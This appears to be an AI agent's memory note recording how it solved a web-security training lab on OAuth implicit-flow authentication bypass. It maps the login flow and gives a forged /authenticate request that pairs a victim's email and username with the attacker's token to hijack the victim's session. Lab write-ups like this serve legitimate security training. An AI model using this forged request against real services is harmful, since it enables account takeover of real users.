---
metadata:
  node_type: memory
name: "oauth implicit flow auth bypass"
description: "Solved lab oauth-authentication-bypass-via-oauth-implicit-flow by forging the client /authenticate email field"
last_updated: 2026-10-10T13:26:44+08:00
created: 2026-10-10T13:26:44+08:00
---

## lab oauth-authentication-bypass-via-oauth-implicit-flow (solved)

Instance: 0a0d001103024c30833fafc400cf00a4.web-security-academy.net; oauth-0a1400fa03a24c438385addd020900dc.oauth-server.net

Path (HTTP-only):
- /my-account -> 302 /social-login -> meta refresh to /auth?client_id=..&redirect_uri=/oauth-callback&response_type=token (implicit flow)
- /auth -> 302 /interaction/<id>; GET it -> sign-in form; POST /interaction/<id>/login (username,password) -> 302; POST /interaction/<id>/confirm -> 302 Location /oauth-callback#access_token=..&token_type=Bearer
- Callback JS: GET oauth /me with Bearer token, then fetch('/authenticate', {body: JSON.stringify({email: j.email, username: j.sub, token})})
- Flaw: /authenticate trusts the body email/username, never binding them to the token subject.

Exploit: POST /authenticate {"email":"carlos@carlos-montoya.net","username":"carlos","token":"<wiener token>"} -> 302 / with Set-Cookie session=<new>; GET /my-account shows "Your username is: carlos" / carlos@carlos-montoya.net.

Verdict: banner_verdict on base URL with the hijacked jar -> solved:true, "Congratulations, you solved the lab!".

Pieces used: page_read, range_launch, http_session (get/post + jar), http_dump, raw_http, banner_verdict.

